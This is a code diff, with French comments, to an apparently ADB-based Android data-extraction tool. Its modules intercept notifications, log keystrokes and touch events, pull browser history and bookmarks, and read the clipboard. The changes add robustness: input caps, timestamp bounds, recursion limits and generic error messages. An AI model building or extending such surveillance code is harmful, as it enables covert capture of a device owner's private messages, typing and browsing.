@@ -7,12 +7,17 @@ import subprocess
 import time
 import re
 import os
-import struct
 from pathlib import Path
-from config import ADB_PATH, TEMP_DIR
 from adb_engine import ADBEngine
 
 adb = ADBEngine()
+
+
+def _decode_out(data):
+    """TimeoutExpired.stdout can be bytes — normalize to str for parsing."""
+    if isinstance(data, bytes):
+        return data.decode("utf-8", errors="replace")
+    return data or ""
 
 
 # ==================== MODULE 5: NOTIFICATION INTERCEPTOR ====================
@@ -25,6 +30,10 @@ def get_notifications():
             return {"success": False, "error": "Impossible de lire les notifications"}
 
         raw = res["stdout"]
+        truncated = False
+        if raw and len(raw) > 2_000_000:   # cap before regex sweeps over it
+            raw = raw[:2_000_000]
+            truncated = True
         notifications = []
 
         # Split by NotificationRecord blocks
@@ -58,7 +67,10 @@ def get_notifications():
             if time_match:
                 ts_ms = int(time_match.group(1))
                 notif["timestamp"] = ts_ms
-                notif["time_str"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ts_ms / 1000))
+                # epoch bounds (0 < t < 2100) — junk postTime only skips this
+                # record's clock line, not the record itself
+                if 0 < ts_ms < 4102444800000:
+                    notif["time_str"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ts_ms / 1000))
 
             # Extract flags
             flags_match = re.search(r'flags=0x([0-9a-fA-F]+)', block)
@@ -78,10 +90,11 @@ def get_notifications():
                 seen.add(key)
                 unique.append(n)
 
-        return {"success": True, "notifications": unique[:50], "count": len(unique)}
+        return {"success": True, "notifications": unique[:50], "count": len(unique),
+                "truncated": truncated}
 
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        return {"success": False, "error": "Erreur lors de la lecture des notifications"}
 
 
 # ==================== MODULE 6: KEYLOGGER / TOUCH EVENT CAPTURE ====================
@@ -104,7 +117,7 @@ def capture_events(duration=5):
             )
             output = res.stdout if res.stdout else ""
         except subprocess.TimeoutExpired as e:
-            output = e.stdout if e.stdout else ""
+            output = _decode_out(e.stdout)
 
         lines = output.splitlines()
 
@@ -141,7 +154,7 @@ def capture_events(duration=5):
         }
 
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        return {"success": False, "error": "Erreur lors de la capture des événements"}
 
 
 def stream_events_raw(duration=5):
@@ -160,10 +173,10 @@ def stream_events_raw(duration=5):
             )
             output = res.stdout if res.stdout else ""
         except subprocess.TimeoutExpired as e:
-            output = e.stdout if e.stdout else ""
+            output = _decode_out(e.stdout)
         return {"success": True, "output": output[:10000]}
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        return {"success": False, "error": "Erreur lors du flux d'événements"}
 
 
 # ==================== MODULE 7: BROWSER HISTORY ====================
@@ -203,7 +216,10 @@ def get_browser_history():
                     ts = int(date_match.group(1))
                     if ts > 1000000000000:
                         ts = ts // 1000
-                    entry["date"] = time.strftime("%Y-%m-%d %H:%M", time.localtime(ts))
+                    # epoch bounds (0 < t < 2100) — junk date only skips this
+                    # entry's clock line, not the entry itself
+                    if 0 < ts < 4102444800:
+                        entry["date"] = time.strftime("%Y-%m-%d %H:%M", time.localtime(ts))
 
                 if entry.get("url"):
                     results["history"].append(entry)
@@ -220,7 +236,10 @@ def get_browser_history():
                 try:
                     import json
                     bm_data = json.loads(chrome_res["stdout"])
-                    def _extract_bm(node):
+                    def _extract_bm(node, depth=0):
+                        # depth + total caps keep hostile JSON bounded
+                        if depth > 20 or len(results["bookmarks"]) >= 2000:
+                            return
                         if isinstance(node, dict):
                             if node.get("type") == "url":
                                 results["bookmarks"].append({
@@ -229,12 +248,12 @@ def get_browser_history():
                                     "date": node.get("date_added", "")
                                 })
                             for v in node.values():
-                                _extract_bm(v)
+                                _extract_bm(v, depth + 1)
                         elif isinstance(node, list):
                             for item in node:
-                                _extract_bm(item)
+                                _extract_bm(item, depth + 1)
                     _extract_bm(bm_data)
-                except (json.JSONDecodeError, Exception):
+                except Exception:
                     results["errors"].append("Chrome bookmarks trouvés mais parsing JSON échoué")
 
         # Method 3: Samsung Internet browser
@@ -260,7 +279,7 @@ def get_browser_history():
         return results
 
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        return {"success": False, "error": "Erreur lors de l'extraction de l'historique"}
 
 
 # ==================== MODULE 8: CLIPBOARD MONITOR ====================
@@ -316,4 +335,4 @@ def get_clipboard():
             return {"success": True, "content": "", "length": 0, "note": "Presse-papier vide"}
 
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        return {"success": False, "error": "Erreur lors de la lecture du presse-papier"}
